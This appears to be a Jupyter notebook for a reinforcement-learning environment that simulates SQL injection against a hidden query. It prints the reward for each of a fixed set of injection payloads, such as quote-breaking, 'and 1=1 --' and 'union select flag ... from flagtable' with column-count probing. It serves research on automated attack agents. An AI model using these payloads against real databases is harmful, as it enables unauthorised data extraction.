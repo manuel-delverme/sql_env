{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "dc16ca7a",
   "metadata": {},
   "outputs": [],
   "source": [
    "import numpy as np\n",
    "from IPython.display import clear_output, display\n",
    "from tqdm import tqdm\n",
    "import environment\n",
    "import gym\n",
    "import structured.generate_actions as gen_acts"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "cb3d7fd8",
   "metadata": {},
   "outputs": [],
   "source": [
    "env = gym.make('SQL-v1')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "2211ca49",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "''"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "actions = gen_acts.generate_actions()\n",
    "env.reset()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "0ad2a666",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "SELECT id, username, name, surname FROM users WHERE id=\"1{input}\"\n",
      "-0.1 |||| SELECT id, username, name, surname FROM users WHERE id=\"1' and 1=1 --\"\n",
      "-0.1 |||| SELECT id, username, name, surname FROM users WHERE id=\"1' and 1=2 --\"\n",
      "-0.1 |||| SELECT id, username, name, surname FROM users WHERE id=\"1' union select NULL --\"\n",
      "-0.1 |||| SELECT id, username, name, surname FROM users WHERE id=\"1' union select NULL, NULL --\"\n",
      "-0.1 |||| SELECT id, username, name, surname FROM users WHERE id=\"1' union select NULL, NULL, NULL --\"\n",
      "-0.1 |||| SELECT id, username, name, surname FROM users WHERE id=\"1' union select NULL, NULL, NULL, NULL --\"\n",
      "-0.1 |||| SELECT id, username, name, surname FROM users WHERE id=\"1' union select NULL, NULL, NULL, NULL, NULL --\"\n",
      "-0.1 |||| SELECT id, username, name, surname FROM users WHERE id=\"1' union select flag from flagtable --\"\n",
      "-0.1 |||| SELECT id, username, name, surname FROM users WHERE id=\"1' union select flag, NULL from flagtable --\"\n",
      "-0.1 |||| SELECT id, username, name, surname FROM users WHERE id=\"1' union select flag, NULL, NULL from flagtable --\"\n",
      "-0.1 |||| SELECT id, username, name, surname FROM users WHERE id=\"1' union select flag, NULL, NULL, NULL from flagtable --\"\n",
      "-0.1 |||| SELECT id, username, name, surname FROM users WHERE id=\"1' union select flag, NULL, NULL, NULL, NULL from flagtable --\"\n",
      "-0.1 |||| SELECT id, username, name, surname FROM users WHERE id=\"1\" and 1=1 --\"\n",
      "-0.1 |||| SELECT id, username, name, surname FROM users WHERE id=\"1\" and 1=2 --\"\n",
      "-1.0 |||| SELECT id, username, name, surname FROM users WHERE id=\"1\" union select NULL --\"\n",
      "-1.0 |||| SELECT id, username, name, surname FROM users WHERE id=\"1\" union select NULL, NULL --\"\n",
      "-1.0 |||| SELECT id, username, name, surname FROM users WHERE id=\"1\" union select NULL, NULL, NULL --\"\n",
      "-0.1 |||| SELECT id, username, name, surname FROM users WHERE id=\"1\" union select NULL, NULL, NULL, NULL --\"\n",
      "-1.0 |||| SELECT id, username, name, surname FROM users WHERE id=\"1\" union select NULL, NULL, NULL, NULL, NULL --\"\n",
      "-1.0 |||| SELECT id, username, name, surname FROM users WHERE id=\"1\" union select flag from flagtable --\"\n",
      "-1.0 |||| SELECT id, username, name, surname FROM users WHERE id=\"1\" union select flag, NULL from flagtable --\"\n",
      "-1.0 |||| SELECT id, username, name, surname FROM users WHERE id=\"1\" union select flag, NULL, NULL from flagtable --\"\n",
      "99.9 |||| SELECT id, username, name, surname FROM users WHERE id=\"1\" union select flag, NULL, NULL, NULL from flagtable --\"\n",
      "-1.0 |||| SELECT id, username, name, surname FROM users WHERE id=\"1\" union select flag, NULL, NULL, NULL, NULL from flagtable --\"\n",
      "-0.1 |||| SELECT id, username, name, surname FROM users WHERE id=\"1 and 1=1 --\"\n",
      "-0.1 |||| SELECT id, username, name, surname FROM users WHERE id=\"1 and 1=2 --\"\n",
      "-0.1 |||| SELECT id, username, name, surname FROM users WHERE id=\"1 union select NULL --\"\n",
      "-0.1 |||| SELECT id, username, name, surname FROM users WHERE id=\"1 union select NULL, NULL --\"\n",
      "-0.1 |||| SELECT id, username, name, surname FROM users WHERE id=\"1 union select NULL, NULL, NULL --\"\n",
      "-0.1 |||| SELECT id, username, name, surname FROM users WHERE id=\"1 union select NULL, NULL, NULL, NULL --\"\n",
      "-0.1 |||| SELECT id, username, name, surname FROM users WHERE id=\"1 union select NULL, NULL, NULL, NULL, NULL --\"\n",
      "-0.1 |||| SELECT id, username, name, surname FROM users WHERE id=\"1 union select flag from flagtable --\"\n",
      "-0.1 |||| SELECT id, username, name, surname FROM users WHERE id=\"1 union select flag, NULL from flagtable --\"\n",
      "-0.1 |||| SELECT id, username, name, surname FROM users WHERE id=\"1 union select flag, NULL, NULL from flagtable --\"\n",
      "-0.1 |||| SELECT id, username, name, surname FROM users WHERE id=\"1 union select flag, NULL, NULL, NULL from flagtable --\"\n",
      "-0.1 |||| SELECT id, username, name, surname FROM users WHERE id=\"1 union select flag, NULL, NULL, NULL, NULL from flagtable --\"\n"
     ]
    }
   ],
   "source": [
    "print(env.hidden_query)\n",
    "for action in actions:\n",
    "    print(env.step(action)[1],\"||||\", env.hidden_query.format(input = action))\n",
    "    #print(env.step(action)[:2],\"||||\", env.hidden_query.format(input = action))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "id": "2f7a9871",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "SELECT id, username FROM users WHERE id=1{input}\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id=1' and 1=1 --\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id=1' and 1=2 --\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id=1' union select NULL --\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id=1' union select NULL, NULL --\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id=1' union select NULL, NULL, NULL --\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id=1' union select NULL, NULL, NULL, NULL --\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id=1' union select NULL, NULL, NULL, NULL, NULL --\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id=1' union select flag from flagtable --\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id=1' union select flag, NULL from flagtable --\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id=1' union select flag, NULL, NULL from flagtable --\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id=1' union select flag, NULL, NULL, NULL from flagtable --\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id=1' union select flag, NULL, NULL, NULL, NULL from flagtable --\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id=1\" and 1=1 --\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id=1\" and 1=2 --\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id=1\" union select NULL --\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id=1\" union select NULL, NULL --\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id=1\" union select NULL, NULL, NULL --\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id=1\" union select NULL, NULL, NULL, NULL --\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id=1\" union select NULL, NULL, NULL, NULL, NULL --\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id=1\" union select flag from flagtable --\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id=1\" union select flag, NULL from flagtable --\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id=1\" union select flag, NULL, NULL from flagtable --\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id=1\" union select flag, NULL, NULL, NULL from flagtable --\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id=1\" union select flag, NULL, NULL, NULL, NULL from flagtable --\n",
      "-0.1 |||| SELECT id, username FROM users WHERE id=1 and 1=1 --\n",
      "-0.1 |||| SELECT id, username FROM users WHERE id=1 and 1=2 --\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id=1 union select NULL --\n",
      "-0.1 |||| SELECT id, username FROM users WHERE id=1 union select NULL, NULL --\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id=1 union select NULL, NULL, NULL --\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id=1 union select NULL, NULL, NULL, NULL --\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id=1 union select NULL, NULL, NULL, NULL, NULL --\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id=1 union select flag from flagtable --\n",
      "99.9 |||| SELECT id, username FROM users WHERE id=1 union select flag, NULL from flagtable --\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id=1 union select flag, NULL, NULL from flagtable --\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id=1 union select flag, NULL, NULL, NULL from flagtable --\n",
      "-1.0 |||| SELECT id, username FROM users WHERE id=1 union select flag, NULL, NULL, NULL, NULL from flagtable --\n"
     ]
    }
   ],
   "source": [
    "env.reset()\n",
    "print(env.hidden_query)\n",
    "for action in actions:\n",
    "    print(env.step(action)[1],\"||||\", env.hidden_query.format(input = action))\n",
    "    #print(env.step(action)[:2],\"||||\", env.hidden_query.format(input = action))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0ad465bf",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9997c57c",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.8"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
